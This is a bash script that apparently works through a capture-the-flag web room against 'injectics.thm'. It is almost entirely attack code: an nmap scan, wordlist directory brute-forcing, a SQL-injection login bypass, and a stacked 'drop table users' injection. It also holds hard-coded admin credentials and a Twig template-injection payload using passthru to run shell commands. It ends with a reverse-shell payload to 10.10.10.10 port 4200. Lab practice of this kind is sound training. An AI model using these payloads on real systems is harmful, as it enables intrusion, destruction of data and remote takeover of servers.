#!/usr/bin/env bash

# Initial Scan
ip='10.10.10.10'
nmap -sV -sC $ip > nmap.txt

## Scan 80

# Discovery
while IFS='' read name
do
    attemtp=$(curl -sL "target$name" -w %{http_code})
    code=${attempt: -3}
    if [[ "$code" == "200" ]]
    then
        echo "name" >> enumerated_files.txt
    fi
done < /usr/share/wordlists/SecLists/Discovery/Web-Content/quickhits.txt

# Home Page
#curl -sL "$target/index.php" -O

# Mail Log
#curl -sL "$target/mail.log" -O

# Login Page
#curl -sL "$target/login.php" -O
#curl -sL "$target/script.js" -O

# Admin Login
#curl -sL "$target/adminLogin007.php" -O

# LOGIN POST REQUEST
username='x'
password='x'
inject="' OR 'x'='x'#;"
#while IFS='' read inject
#do
#   response=$(curl -sL "$target/functions.php" -d "username=$username $inject" -d "password=$password")
#   size=${#response}
#   if [[ $size != 56 ]];
#   then
#       echo $inject
#   fi
#done < injects.txt

# Bypass
#curl -sL "$target/functions.php" -d "username=$username $inject" -d "password=$password" --cookie-jar login.cookie


#curl -sL "$target/edit_leaderboard.php" --cookie login.cookie -d "rank=1" -d "country=USA" -d "gold=30; drop table users #;" -d "silver=30" -d "bronze=30"

#curl -sL "$target/dashboard.php" --cookie login.cookie -O

# Use Credentials
username='superadmin@injectics.thm'
password='superSecurePasswd101'
#curl -sL "$target/adminLogin007.php" -d "mail=$username" -d "pass=$password" --cookie-jar admin.cookie -o admin-login.php

# SUPER ADMIN
#curl -sL "$target/update_profile.php"  --cookie admin.cookie -O
#curl -sL "$target/composer.json" -O
curl -sL "$target/update_profile.php" -d "fname={{['"'bash -c ls\", '']|sort('passthru')}}" -d "email=$username" --cookie admin.cookie
curl -sL "$target/update_profile.php"  --cookie admin.cookie -O
curl -sL "$target/dashboard.php"  --cookie admin.cookie

{{["bash -c 'exec bash -i >& /dev/tcp/10.10.10.10/4200 0>&1'",'']|sort('passthru')}}
